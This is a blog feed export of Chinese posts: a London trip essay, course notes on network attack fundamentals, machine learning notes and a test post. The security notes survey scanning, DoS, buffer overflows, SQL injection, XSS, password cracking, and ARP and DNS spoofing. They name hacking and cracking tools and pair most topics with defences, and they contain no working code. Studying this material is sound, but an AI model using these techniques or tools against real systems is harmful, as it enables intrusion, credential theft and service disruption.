非常的简洁，一栋栋房屋都非常的精致，屋外的车看起来也比别的地方要高档很多，我猜这样的环境也是它成为富人区的一个重要条件，而荷兰公园就坐落于这个区域的中心。进入公园映入眼帘的是大片的绿地，两边的树木青翠欲滴，边上还有网球场并且有孩子们在游戏。再往里走是一个看似格格不入但又巧妙融合进公园的一个日式庭院“京都庭园”，里面有假山、池塘，还有自由游动的鲤鱼，一切都是那么的和谐美好。更有趣的是，公园里的松鼠非常多，而且不怕人，第一次看到这么多可爱的小家伙们，心情都会大好。</p><p>​最后我想说的是白金汉宫。恰逢今年是维多利亚女王登基七十周年纪念，白金汉宫会对游客开放部分房间。我们当即购买了门票，亲自领略一下皇家风范。与其他地方不同的是，这里是我到过唯一需要安检的地方，而且全程不允许拍照。这倒也好，可以更好地欣赏里面的一切。而在室内，最让我印象深刻的就是室内的装饰，几乎所有能看到的家具、墙壁上都或多或少地有很精美的装饰，从雕花的柱子，到精致的茶杯，一切都无比精致。还有就是女王的收藏，包括大量名家的画作和雕塑，每一样都可以说是世界级的珍品。相比于中国皇家园林的森严和庄重，在我看来，白金汉宫虽然也是奢华至极，但却有更多家的感觉。逛完了宫内，我们还在白金汉宫后花园内喝了一杯茶，看着属于女王的鸽子们飞过，心中非常的惬意。这里还有太多太多值得我们发现的地方，只能留给将来继续细细品味。</p><h4 id="（三）感悟于收获"><a href="#（三）感悟于收获" class="headerlink" title="（三）感悟于收获"></a>（三）感悟于收获</h4><p>​由于是第一次出国，我也不好将英国于其他国家相比，只能说说于国内的不同。首先让我感受很深的是伦敦市民的普遍素质很高，当然这也是作为世界上接受高等教育比例最高城市的必然所在，首先是地铁站没有安检，很多轻轨站连闸机都没有，刷卡全部靠自觉，而且几乎所有本地人都一定会遵守先下后上的原则，倒是我们这些外来的有时会不守规矩。其次就是人文关怀。几乎所有的车站都会配备直梯或者坡道供轮椅使用者进出，所有停车场都会有比平常车位大一号的残疾人专用车位，并且严禁随意占用。在我看来，对弱者的关怀就体现了一个社会的发达程度，所以这一点还需要我们学习。</p><p>​在短短的二十天时间里，我不仅学到了非常有用的专业知识，更通过实践巩固和加深了所学，更重要的则是开阔了眼界，增长了见识，真正见识到一种于平时完全不同的文化和完全不同的人群。所以说，这次经历对我异常的宝贵，也坚定了我更加努力学习，将来能够走出去看到更加广阔世界的决心。</p><p>​最后，我想对在此次旅程中帮助过我的人们表示感谢，感谢张昭老师和李明进老师对我们的负责，感谢校方Chris OK全程为我们规划行程、提供交通和住宿；感谢为我们上课的三位老师的认真授课；感谢电子科技大学为我提供了这样一个能够大开眼界的好机会。</p>]]></content>
    
    
    
    <tags>
      
      <tag>游记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>网络攻击基础</title>
    <link href="/2019/04/27/2019-4-27-Network-attacking-fundamentals/"/>
    <url>/2019/04/27/2019-4-27-Network-attacking-fundamentals/</url>
    
    <content type="html"><![CDATA[<h2 id="第二章-信息收集"><a href="#第二章-信息收集" class="headerlink" title="第二章 信息收集"></a>第二章 信息收集</h2><ul><li>步骤：踩点，扫描，查点。</li><li>Whois查询：DNS注册信息，IP。</li><li>DNS查询工具：nslookup&#x2F;dig</li></ul><h3 id="网络扫描"><a href="#网络扫描" class="headerlink" title="网络扫描"></a>网络扫描</h3><h4 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h4><ul><li>Ping扫描：ping, Nmap(危害不大)</li><li>Ping扫射：同时扫描大量IP地址；软件：Nmap, fping, hping2, Superscan</li><li>监测：网络入侵检测系统Snort，主机扫描检测工具Scanlogd</li><li>防御：考虑ICMP通信的过滤策略</li></ul><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><ul><li>连接目标主机的TCP和UDP端口，确定哪些服务正在运行即处于监听状态的过程。</li><li>工具：udp_scan, nmap, WUPS, ScanLine</li><li>FIN扫描：可以绕过某些防火墙；会被记录到日志； 使用RAW IP编程，较为复杂。</li><li>一般扫描：TCP connect，TCP SYN，TCP FIN，IP段</li><li>高级扫描：TCP反向ｉｄｅｎｔ扫描。通过未公开的函数，系统漏洞或非正常的调用产生特殊信息</li></ul><h4 id="系统类型探查"><a href="#系统类型探查" class="headerlink" title="系统类型探查"></a>系统类型探查</h4><ul><li>探查活跃主机的系统及开放网络服务的类型。PADS</li></ul><h4 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h4><ul><li>检查系统是否存在已公布的安全漏洞。</li><li>漏洞扫描软件：ISS，SATAN&#x2F;SAINT，Nessus，OpenVAS，Xscan</li></ul><h3 id="网络查点"><a href="#网络查点" class="headerlink" title="网络查点"></a>网络查点</h3><ul><li>针对已知的弱点，对识别出来的服务进行更加充分更具针对性的探查，来寻找真正可以攻击的入口，以及攻击过程中可能需要的关键数据。</li><li>与踩点的区别：攻击者的入侵程度。</li><li>与扫描的区别：攻击者的针对性与信息收集的目标性。</li><li>net view &#x2F; domain; nbtstat</li><li>预防方法：关闭不必要的服务；关闭打印与共享服务（SMB）；关闭盘符默认共享；禁止SMB匿名空会话</li></ul><h3 id="网络嗅探与协议分析"><a href="#网络嗅探与协议分析" class="headerlink" title="网络嗅探与协议分析"></a>网络嗅探与协议分析</h3><ul><li>嗅探工具：wireshark</li><li>网络嗅探：利用计算机网络接口截获目的地为其他计算机的数据报文，监听网络流中所包含的用户账户密码或私密信息等。</li><li>共享式网络：通过集线器连接，所有数据包发往每一个主机</li><li>交换式网络：通过交换机连接，发包只能到特定端口。</li><li>嗅探攻击：MAC地址洪范；MAC欺骗；ARP欺骗；</li><li>工具：BPF，Libpcap，Tcpdump，SnifferPro</li><li>防范：采用交换式网络，静态ARP，避免使用明文传输口令和敏感信息的网络协议。</li><li>ICMP探测<ul><li>优点：如ping命令，返回TTL可以判断主机操作系统的类型和经过的路由器数量。进而查找主机IP</li><li>缺点：很容易被防火墙限制。</li></ul></li></ul><h2 id="第三章-拒绝服务攻击"><a href="#第三章-拒绝服务攻击" class="headerlink" title="第三章 拒绝服务攻击"></a>第三章 拒绝服务攻击</h2><ol><li><strong>概念：DoS攻击是指利用网络协议漏洞或其他系统以及应用软件的漏洞耗尽被攻击目标资源，使得被攻击的计算机或网络无法正常提供服务，直至系统停止响应甚至崩溃的攻击方式。即攻击者通过某种手段，导致目标机器或网络停止向合法用户提供正常的服务或资源访问。</strong></li><li>基本模式<ol><li>资源耗尽型：消耗网络带宽、磁盘空间、内存资源</li><li>配置修改型：修改或删除系统文件或配置文件使得系统服务停止或性能降低。</li><li>基于系统缺陷型</li><li>物理实体破坏型</li></ol></li><li>基本形式<ol><li>服务过载：计算机忙碌地处理不断到来的服务请求，以至于无法处理常规的任务。同时，许多新到来的请求被丢弃。</li><li>消息流：消息流发生于用户向一台网络上的目标主机发送大量的数据报，来延缓目标主机的处理速度，阻止它处理正常任务。</li><li>信号接地：物理方法</li><li>粘住 攻击：TCP半连接耗尽资源。</li></ol></li><li>分类<ol><li>SYN Flood：半连接；对Windows NT有效，IP欺骗技术。（在防火墙上过滤同一主机的后续连接）。</li><li>死Ping：当发送ping请求的数据包声称自己的尺寸超过ICMP上限，也就是加载的尺寸超过64K上限时，就会使ping请求接收方出现内存分配错误，导致TCP&#x2F;IP堆栈崩溃致使接受方当机。</li><li>泪滴（Teardrop）：发送不正确的IP分片在某些情况下会破环整个IP协议栈，需要重启。</li><li>Land攻击：特制一个SYN包，源地址与目的地址都为某一服务器，自己创建于自己的空连接。</li><li>Smurf攻击：通过将回复地址设置成受害网络的广播地址的ICMP应答请求数据报来淹没受害主机的方式进行。最终导致该网络的所有主机都对此ICMP应答请求作出答复，导致网络阻塞。</li><li>Fraggle攻击：与Smurf类似，但使用的是UDP Echo。</li><li>炸弹攻击：利用工具软件，集中在一段时间内，向目标机发送大量垃圾信息，或是发送超出系统接收范围的信息，使对方出现负载过重、网络堵塞等状况，从而造成目标的系统崩溃及拒绝服务</li></ol></li><li>DDos<ol><li>主控端：接受攻击者命令并发送到代理主机上。</li><li>代理段：运行攻击程序，接受命令并发起攻击。</li><li>发送的报文：UDP</li></ol></li><li>僵尸网络<ol><li>通过IRC控制bot</li><li>检测：IDS方法；行为监测法；蜜罐捕捉法。</li></ol></li></ol><h2 id="第四章-缓冲区溢出攻击"><a href="#第四章-缓冲区溢出攻击" class="headerlink" title="第四章 缓冲区溢出攻击"></a>第四章 缓冲区溢出攻击</h2><ol><li>缓冲区：应用程序用来保存用户输入数据、程序临时数据的内存空间。位置：栈、堆、数据段</li><li>命令：strcpy(buffer，input); </li><li>手段：通过制造缓冲区溢出使程序运行一个用户shell，再通过shell执行其他命令。如果该程序属于root且有suid权限的话，攻击者就获得了一个有root权限的shell，便可以对系统进行任意操作。</li><li><strong>危害：应用程序异常、系统不稳定甚至崩溃、程序跳转到恶意代码。</strong></li><li>![1573213229376](C:\Users\Adam Young\AppData\Roaming\Typora\typora-user-images\1573213229376.png)</li><li>栈<ol><li>连续的内存空间。</li><li>先入后出，生长方向：高地址向低地址。</li><li>每一个线程有自己的栈。</li><li>ESP：栈顶；EBP：栈底。</li><li>内容：函数参数，返回地址，EBP，通用寄存器值，函数局部变量。</li></ol></li><li>重要寄存器：<ol><li>ESP：栈顶。</li><li>EBP：基地址，相对稳定的位置。</li><li>EIP：指令寄存器，函数调用返回后下一个执行语句的地址。</li></ol></li></ol><ul><li>strncpy_s()函数为安全函数，不会被利用。</li><li>全局变量和静态变量在同一块内存。</li><li>常量存储区存放常量，不能修改。</li></ul><p><strong>函数调用过程</strong></p><ol><li>把参数压入栈。</li><li>保存EIP内容作为返回地址。</li><li>放入堆栈当前基址寄存器。</li><li>把当前ESP拷贝到基址寄存器，作为新的基地址。</li><li>为本地变量留出一定空间，把ESP减去适当数值。</li><li>调用后恢复EBP，EIP，局部变量不处理。</li></ol><p><strong>溢出种类及利用</strong></p><ol><li>栈溢出<ol><li>特点：缓冲区在栈中分配，拷贝数据过长，覆盖了返回地址或其他重要数据结构。</li></ol></li></ol><p><strong>C语言中的内存分配</strong></p><ol><li>函数体中定义的变量通常在栈上，若是显式分配（malloc）则在堆上。</li><li>静态变量在全局区。</li><li>字符串存放在常量区。</li></ol><p><strong>C++中内存分配</strong></p><ol><li>分区：<ol><li>栈：编译器自动分配回收。局部变量、函数参数。</li><li>堆：用new分配。</li><li>自由存储区：用malloc分配。</li><li>全局&#x2F;静态存储区：不分初始化和未初始化。</li><li>常量储存区：不能修改。</li></ol></li></ol><p><strong>堆栈的关系和区别</strong></p><ol><li>栈是系统提供的功能，特点是快速高效，缺点是有限制，数据不灵活；而堆是函数库提供的功能，特点是灵活方便，数据适应面广泛，但是效率有一定降低。</li><li>§栈是系统数据结构，对于进程&#x2F;线程是唯一的；堆是函数库内部数据结构，不一定唯一。不同堆分配的内存无法互相操作。</li></ol><p><strong>堆溢出</strong></p><ol><li>特点：缓冲区在堆中分配，复制内容覆盖了管理结构。</li></ol><p><strong>整形溢出</strong></p><ol><li>概念：试图保存一个比它可以表示的最大值还大的数时，就会发生整数溢出。结果不可预料。</li><li>危害：发生前无法预料。</li><li>现象：取模。</li><li>分类<ol><li>宽度溢出：普通。</li><li>运算溢出：运算后结果太大。</li><li>符号溢出：无符号被看作有符号，或相反。</li></ol></li></ol><p><strong>ShellCode</strong></p><ol><li>功能：添加管理员用户，远程可用shell，下载程序。穿透防火墙等。</li></ol><p><strong>溢出保护技术</strong></p><ol><li>程序员：安全编程，软件质量控制，源码级纠错工具。</li><li>编译器：数组边界检查，编译时加入条件如canary保护。</li><li>语言：使用类型安全语言：C#，JAVA</li><li>Runtime保护：二进制地址重写，Hook危险函数技术。</li><li>操作系统：非执行缓冲区。堆栈不可执行，数据段不可执行</li></ol><p><strong>安全编程技术</strong></p><ol><li>设计安全的系统</li><li>代码规范和风格。</li></ol><h2 id="第五章-Web应用程序"><a href="#第五章-Web应用程序" class="headerlink" title="第五章 Web应用程序"></a>第五章 Web应用程序</h2><p><strong>Web应用的分层模型</strong></p><ol><li>表示层：接收客户端输入并显示结果。</li><li>业务逻辑层：动态脚本。</li><li>数据层：数据库，本地文件。</li></ol><p><strong>传输协议</strong></p><ol><li>HTTP：无状态，明文传输，请求&#x2F;响应模式——&gt;易受攻击。</li><li>HTTPS：基于SSL&#x2F;TLS提供对传输层认证和加密。</li></ol><p><strong>Web应用的信息收集</strong></p><ol><li>服务器域名、IP等</li><li>Web端口、开放服务等</li><li>站点类型与脚本，应用程序类型与版本</li><li>Web服务器&#x2F;应用程序中的安全漏洞。<ol><li>手工审查应用结构与源代码</li><li>自动下载与镜像Web站点页面。</li><li>使用Google Hacking技术审查与探测Web应用程序。（工具：Site Digger）</li></ol></li></ol><p><strong>攻击Web服务器软件</strong></p><ul><li>IIS，MS SQL ASP </li><li>远程渗透：IIS，SQL，红色代码，尼姆达，SQL Slammer。</li></ul><p><strong>Web服务器的漏洞</strong></p><ol><li>数据驱动的远程代码执行。</li><li>服务器功能扩展模块</li><li>样本文件。</li><li>源代码泄露。</li><li>资源解析攻击。</li></ol><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a><strong>SQL注入</strong></h3><ol><li>定义：利用Web应用程序数据层存在的输入验证不完善型安全扣动实施的一类代码注入攻击。</li><li>漏洞机制：用户输入没有被正确地过滤：转义字符。</li><li>没有进行严格的类型检查。</li></ol><p><strong>攻击步骤</strong></p><ol><li>发现SQL注入点。</li><li>判断后台数据库类型。</li><li>利用SQL注入进行后台口令拆解。</li><li>上传ASP后门，得到默认账户权限。</li><li>本地特权提升与利用数据库扩展存储过程。</li></ol><p><strong>注入工具</strong></p><ol><li>漏洞发现：Wposion，mieliekoek.pl</li><li>注入测试：SPIKE Proxy；SPI Toolkit</li><li>黑客工具：NBSI，HDSI，啊D，CSC，WED，Pangolin</li></ol><p><strong>防范措施</strong></p><ol><li>使用类型安全的参数编码机制。</li><li>用户输入要进行完备检查。</li><li>将动态SQL语句替换为存储过程，预编译SQL或ADO命令对象。</li><li>加强SQL数据库服务器的配置与连接。</li></ol><p><strong>危害</strong>（考点）</p><ol><li>数据库信息泄露。</li><li>网页篡改。</li><li>网站挂马。</li><li>私自添加系统账户。</li><li>读写文件获取webshell</li></ol><p><strong>暴库</strong></p><p>通过一些技术手段或者程序漏洞得到数据库的地址，并将数据非法下载到本地。</p><h4 id="XSS跨站脚本攻击"><a href="#XSS跨站脚本攻击" class="headerlink" title="XSS跨站脚本攻击"></a>XSS跨站脚本攻击</h4><ol><li>跨站脚本：跨站脚本是一种通常存在于Web应用程序中的安全漏洞，使得攻击者可以将恶意的代码注入到网页中，从而危害其他Web访问者。</li><li>与代码注入的比较：<ol><li>相似点：Web应用程序没有对非预期输入作出全面的检查与净化。</li><li>不同点：代码注入的目标：Web站点；XSS：访问Web应用程序的其他用户。</li></ol></li></ol><p><strong>典型攻击</strong></p><ul><li>查看终端会话Cookie。</li><li>窃取Cookie。</li><li>网页挂马。</li></ul><p><strong>攻击类型（考点）</strong></p><ul><li><strong>持久性XSS：通过利用跨站漏洞构建恶意脚本（留言本，论坛，博客）。</strong></li><li><strong>非持久性XSS：用户输入产生XSS反馈给该用户，需要结合社会工程学进行攻击。</strong></li><li><strong>DOM-based：本地XSS，如JS本地生成HTML页面中存在。</strong></li></ul><p><strong>防范措施</strong></p><ul><li>服务器端：限制，拒绝，净化。输入验证，输入净化，消除危险输入点。</li><li>客户端：提高浏览器访问非受信网站时的安全等级。</li><li>关闭Cookie或设置为只读。</li><li>安全意识和浏览习惯。</li></ul><h4 id="Web浏览器的技术发展与安全威胁"><a href="#Web浏览器的技术发展与安全威胁" class="headerlink" title="Web浏览器的技术发展与安全威胁"></a>Web浏览器的技术发展与安全威胁</h4><p><strong>安全威胁类型、</strong></p><ol><li>网络钓鱼<ol><li>目标：获取个人敏感信息</li><li>欺骗技术：DNS中毒，网络流量重定向，欺骗性垃圾邮件。</li><li>欺骗策略：使用IP代替域名；注册相似的DNS域名；对URL进行编码和混淆，修改地址映射HOSTS文件。</li><li>防范措施：了解威胁与技巧；增强安全意识，提高警惕性；安装安全软件。</li></ol></li><li>恶意木马与流氓软件下载：捆绑安装；软件：Site Advisor</li><li>网页木马-浏览器渗透攻击<ol><li>木马：<img src="/../../../../AppData/Roaming/Typora/typora-user-images/1573966156941.png" alt="1573966156941"></li><li>典型网页木马：MS06-014，ANI</li><li>网络访问流量重定向：内嵌HTML标签，恶意脚本，内嵌对象</li><li><strong>木马的定义：计算机木马病毒是指隐藏在正常程序中的一段具有特殊功能的恶意代码，是具备破坏和删除文件、发送密码、记录键盘和攻击Dos等特殊功能的后门程序。</strong></li><li><strong>特点：</strong><ol><li><strong>隐蔽性：伪装成合法程序。首要特征。</strong></li><li><strong>欺骗性：使用合法后缀名，使用容易混淆的字母命名。</strong></li><li><strong>顽固性：有多个备份，而且会关联执行。</strong></li><li><strong>危害性：可以盗取用户的重要信息。</strong></li></ol></li></ol></li><li>不良信息内容</li></ol><p><strong>网站挂马威胁防范</strong></p><ol><li>补丁：系统补丁，软件升级。</li><li>杀毒软件。</li><li>提高安全意识。</li></ol><p><strong>病毒</strong></p><ol><li>概念：编制者在计算机程序中插入的破坏计算机功能或者数据的代码，能影响计算机使用，能自我复制的一组<a href="https://baike.baidu.com/item/%E8%AE%A1%E7%AE%97%E6%9C%BA">计算机</a>指令或者程序<a href="https://baike.baidu.com/item/%E4%BB%A3%E7%A0%81/86048">代码</a>。。</li><li>特征：传播性，感染性，潜伏性，隐蔽性，破坏性。</li><li>传播途径：<ol><li>存储设备：U盘，CD等</li><li>网络：网页，电子邮件</li><li>利用计算机系统和软件弱点传播。</li></ol></li></ol><h2 id="第七章-口令攻击"><a href="#第七章-口令攻击" class="headerlink" title="第七章 口令攻击"></a>第七章 口令攻击</h2><p><strong>本章要求</strong></p><ol><li>了解口令攻击的方法与类别。</li><li>掌握Windows系统口令验证机制的工作流程（LM，NTLM，Kerberos）</li><li>熟悉常用口令破解工具和常用口令攻击方法。</li><li>掌握Windows系统口令的防护方法。</li></ol><p><strong>主动口令攻击</strong></p><ul><li>字典攻击：由很多条可能口令的文本文件导入破解程序。</li><li>强力攻击：尝试所有字符的组合方式。</li></ul><p><strong>被动截获</strong></p><ul><li>欺骗攻击：通过贡献的网站服务器、端口重定向、伪装网站钓鱼。</li><li>嗅探攻击：如在FTP信道上的窃听。</li></ul><p><strong>Windows下的口令攻击</strong></p><ul><li>LAN Manager处理过程：口令变成大写，补全为14个字符，分成两个7字符，DES加密得到一个64位密文，服务器存储共128位密文。<ul><li>验证：</li></ul></li><li>NTLM口令处理过程：将口令变成Unicode编码，使用MD４散列算法，保存得到的１２８位散列值。</li><li><img src="/../../../../AppData/Roaming/Typora/typora-user-images/1573826880407.png" alt="1573826880407"></li></ul><p><strong>口令存储</strong></p><ul><li>SAM数据库：Windows NT&#x2F;2000使用的安全账号管理器机制来管理用户账号</li></ul><p><strong>常用口令攻击方法</strong></p><ul><li>本地获取</li><li>远程猜解</li><li>嗅探</li></ul><p><strong>常用破解工具</strong></p><ul><li>L0phtcrack、NTSweep、NTCrack、PDWump。。。</li></ul><p><strong>彩虹表破解</strong></p><ul><li>彩虹表：特定字符的各种组合以及这些组合经过MD5或LM或NTLM等加密后的对照表。</li><li>软件Rainbow Crack，ophcrack，Free Rainbow Tables</li></ul><p><strong>口令的防护</strong></p><ul><li>选择安全密码：足够长，混合口令。</li><li>防止口令猜测攻击：硬盘分区采用NTFS格式、正确设置和管理账户、禁止不需要的服务、关闭不用的接口、禁止建立空连接。</li><li>设置安全策略：强密码历史，密码最长使用期限，密码最短使用期限、密码长度最小值。</li></ul><h2 id="第八章-假消息攻击"><a href="#第八章-假消息攻击" class="headerlink" title="第八章 假消息攻击"></a>第八章 假消息攻击</h2><p><strong>网络安全属性</strong></p><ul><li>机密性、完整性、可用性、真实性、不可抵赖性。</li></ul><p><strong>网络攻击基本模式</strong></p><p>​截获、篡改、中断、伪造</p><p><img src="/../../../../AppData/Roaming/Typora/typora-user-images/1573828155197.png" alt="1573828155197"></p><p><strong>工具</strong>：Sniffer，Netwox&#x2F;Netwag</p><p><strong>IP源地址欺骗</strong></p><ul><li>伪造具有虚假源地址IP数据包进行发送。</li><li>目的：隐藏攻击者身份、假冒其他计算机通过身份认证。</li><li>原理：路由转发只是用目标IP地址，不对源IP做验证</li><li>场景：On-path&#x2F;Off-path</li><li>防范措施：<ul><li>使用随机化的初始序列号</li><li>使用网络层安全传输协议如IPsec</li><li>避免采用基于IP地址的信任策略。</li><li>在路由器和网关上实施包检查和过滤。</li><li>真实源IP地址验证。</li></ul></li></ul><p><strong>依赖于IP源欺骗的其他网络协议攻击</strong></p><ol><li>ICMP Smurf放大攻击：Smurf攻击向路由器发送大量的ICMP协议报文。这会触发每个连接的设备向欺骗地址做出响应。（DDoS)</li><li>DNS放大攻击。</li><li>ICMP路由重定向</li><li>TCP RST</li><li>DNS Spoofing</li><li>DDoS：SYN&#x2F;UDP Flooding。</li></ol><h4 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a><strong>ARP欺骗</strong></h4><ol><li>ARP：将IP地址映射为物理地址MAC。</li><li>ARP欺骗：发送伪造的APR消息，对特定IP所对应的MAC地址进行假冒。</li></ol><p><strong>应用场景</strong></p><ol><li>利用ARP欺骗进行交换网络中的嗅探</li><li>构造中间人攻击，从而实施TCP会话劫持。</li><li>ARP病毒传播。</li><li>ARP欺骗挂马。</li></ol><p><strong>防范措施</strong></p><ol><li>静态绑定关键主机的IP与MAC映射。</li><li>使用VLAN虚拟子网细分网络拓扑。</li><li>加密传输数据。</li><li>使用ARP防火墙。</li></ol><h4 id="ICMP-路由重定向攻击"><a href="#ICMP-路由重定向攻击" class="headerlink" title="ICMP 路由重定向攻击"></a>ICMP 路由重定向攻击</h4><ol><li>概念：伪装成路由器发送虚假的ICMP路由路径控制包围，使受害主机选择攻击者指定的路由路径。</li><li>目的：嗅探或假冒攻击。</li><li>软件：Netwox</li><li>防范：<ol><li>根据类型过滤一些ICMP数据包。</li><li>设置防火墙过滤。</li><li>对于重定向报文判断是否来自本地路由器。</li></ol></li></ol><h4 id="RST攻击"><a href="#RST攻击" class="headerlink" title="RST攻击"></a>RST攻击</h4><ol><li>概念：通过伪造TCP 重置报文，强制关闭TCP会话连接。</li><li>场景：恶意拒绝服务攻击，重置入侵，GFW。</li><li>原理：<img src="/../../../../AppData/Roaming/Typora/typora-user-images/1573969256371.png" alt="1573969256371"></li><li>条件：通讯目标接收TCP包（IP一致，序列号在窗口内）</li></ol><h4 id="DNS-Spoofing"><a href="#DNS-Spoofing" class="headerlink" title="DNS Spoofing"></a>DNS Spoofing</h4><ol><li>攻击过程：嗅探DNS请求包，注入假冒DNS</li><li>特性：攻击者能够获取攻击所需的所有信息，注入相应包比真的相应包更早到达受害者。受害者可能接收到多个应答包，竞赛法则。</li></ol><h4 id="TCP-x2F-IP网络协议栈攻防措施"><a href="#TCP-x2F-IP网络协议栈攻防措施" class="headerlink" title="TCP&#x2F;IP网络协议栈攻防措施"></a>TCP&#x2F;IP网络协议栈攻防措施</h4><ol><li>网络接口层：防止嗅探。</li><li>互连层：检测和过滤技术，增强防火墙等安全策略；关键服务器静态绑定IP映射表</li><li>传输层：加密传输，安全控制机制。</li><li>应用层：加密，用户级身份认证；数字签名；</li><li>安全协议：<img src="/../../../../AppData/Roaming/Typora/typora-user-images/1573970108538.png" alt="1573970108538"></li><li>SYN Flood：服务器收到一个SYN后不立即分配缓冲区。</li></ol><h2 id="第九章-无线网络和移动中断安全威胁"><a href="#第九章-无线网络和移动中断安全威胁" class="headerlink" title="第九章 无线网络和移动中断安全威胁"></a>第九章 无线网络和移动中断安全威胁</h2><ul><li>802.11安全弱点：<ol><li>广播网络，共享介质：没有明确的边界，无法有效控制；很难探知窃听、发送点的位置，难以追溯攻击。</li><li>威胁：窃听、注入、信道抢占&#x2F;干扰、身份假冒</li></ol></li><li>网络连接过程<ol><li>搜索无线网络：信道扫描</li><li>认证</li><li>关联：响应关联强求，DHCP分配IP</li></ol></li><li>网络攻击<ol><li>无线网络踩点：侦察无线网络和接入点，无线踩点：漫步，自行车，驾车</li><li>踩点软件：NetStumbler：基于Windows，GPS，对禁用广播请求的AP无效</li><li>Kismet。Linux</li></ol></li><li>WIFI加密方式<ul><li>不加密：开放网络。</li><li>WEP：RC4，CRC32校验，存在缺陷，极易破解。AirCracl NG破解工具</li><li>WPA&#x2F;WPA2：预先共享密钥，外部身份认证服务（AES等）</li></ul></li><li>WiFi安全机制：<ul><li>MAC地址过滤</li><li>禁止SSID广播</li></ul></li><li>移动终端恶意代码</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Notes</tag>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Week 1 Introduction</title>
    <link href="/2019/01/17/2019-1-17-Week-1-Introduction/"/>
    <url>/2019/01/17/2019-1-17-Week-1-Introduction/</url>
    
    <content type="html"><![CDATA[<h1 id="Week-1-Introduction"><a href="#Week-1-Introduction" class="headerlink" title="Week 1 Introduction"></a>Week 1 Introduction</h1><h2 id="What-is-Machine-Learning"><a href="#What-is-Machine-Learning" class="headerlink" title="What is Machine Learning?"></a>What is Machine Learning?</h2><p>​Tom Mitchell provides a more modern definition: “A computer program is said to learn from experience E with respect to some class of tasks T and performance measure P, if its performance at tasks in T, as measured by P, improves with experience E.”(对某一任务表现水平随不断经历某种过程而提高)</p><p>Example: playing checkers.</p><p>E &#x3D; the experience of playing many games of checkers</p><p>T &#x3D; the task of playing checkers.</p><p>P &#x3D; the probability that the program will win the next game.</p><p>In general, any machine learning problem can be assigned to one of two broad classifications:</p><h3 id="Types"><a href="#Types" class="headerlink" title="Types"></a>Types</h3><h4 id="Supervised-Learning"><a href="#Supervised-Learning" class="headerlink" title="Supervised Learning"></a>Supervised Learning</h4><p><strong>对于给定的数据，已知其正确结果的形态和输入和输出的关系。</strong></p><h5 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h5><ol><li><p>“regression”回归：连续型（广义，不一定绝对连续，如销量）</p></li><li><p>”classification”分类：离散型（可能性通常很少，如0-1）</p></li><li><p>example：</p><p>(a) Regression - Given a picture of a person, we have to predict their age on the basis of the given picture</p><p>(b) Classification - Given a patient with a tumor, we have to predict whether the tumor is malignant or benign.</p></li></ol><h4 id="Unsupervised-Learning"><a href="#Unsupervised-Learning" class="headerlink" title="Unsupervised Learning"></a>Unsupervised Learning</h4><p><strong>未知结果。可以在不知道中间的各种变量的意义的情况下，根据变量的结构、关系做出推断。</strong></p><p>Example：</p><p>Clustering: Take a collection of 1,000,000 different genes, and find a way to automatically group these genes into groups that are somehow similar or related by different variables, such as lifespan, location, roles, and so on.</p><p>Non-clustering: The “Cocktail Party Algorithm”, allows you to find structure in a chaotic environment. (i.e. identifying individual voices and music from a mesh of sounds at a <a href="https://en.wikipedia.org/wiki/Cocktail_party_effect">cocktail party</a>).</p><h2 id="Model-and-Cost-Function"><a href="#Model-and-Cost-Function" class="headerlink" title="Model and Cost Function"></a>Model and Cost Function</h2><h3 id="Model-Representation"><a href="#Model-Representation" class="headerlink" title="Model Representation"></a>Model Representation</h3><ol><li><p>数据集表示：<img src="/assets%5C1547720243394.png" alt="1547720243394"></p></li><li><p>预测结果h(x)：”A good predictor”，Hypothesis</p></li><li><p>流程：<img src="/assets%5CH6qTdZmYEeaagxL7xdFKxA_2f0f671110e8f7446bb2b5b2f75a8874_Screenshot-2016-10-23-20.14.58.png" alt="img"></p><h3 id="Cost-Function"><a href="#Cost-Function" class="headerlink" title="Cost Function"></a>Cost Function</h3></li></ol><p><img src="/assets%5C1547721315822.png" alt="1547721315822"></p><p><strong>代价方程，又称平方误差方程，是衡量预测方程和真实值之间误差的函数。</strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>AI</tag>
      
      <tag>Notes</tag>
      
      <tag>Coursera</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello world!</title>
    <link href="/2018/10/07/2018-10-07-Hello-world!/"/>
    <url>/2018/10/07/2018-10-07-Hello-world!/</url>
    
    <content type="html"><![CDATA[<h1 id="Hello-world"><a href="#Hello-world" class="headerlink" title="Hello world!"></a>Hello world!</h1><h2 id="This-is-a-prototype-of-my-blog"><a href="#This-is-a-prototype-of-my-blog" class="headerlink" title="This is a prototype of my blog"></a>This is a prototype of my blog</h2><p>It will become better shortly.</p><h3 id="Test"><a href="#Test" class="headerlink" title="Test"></a><u>Test</u></h3><h4 id="Test-1"><a href="#Test-1" class="headerlink" title="Test"></a><em>Test</em></h4><h5 id="test"><a href="#test" class="headerlink" title="test"></a><strong>test</strong></h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cout &lt;&lt; This is a test program &lt;&lt; endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>$$<br>P(x)&#x3D;e^x\over \pm b^2-\sqrt{4ac}<br>$$</p><blockquote><p>This is a test of quote.</p></blockquote><p>This is a test of image</p><p><img 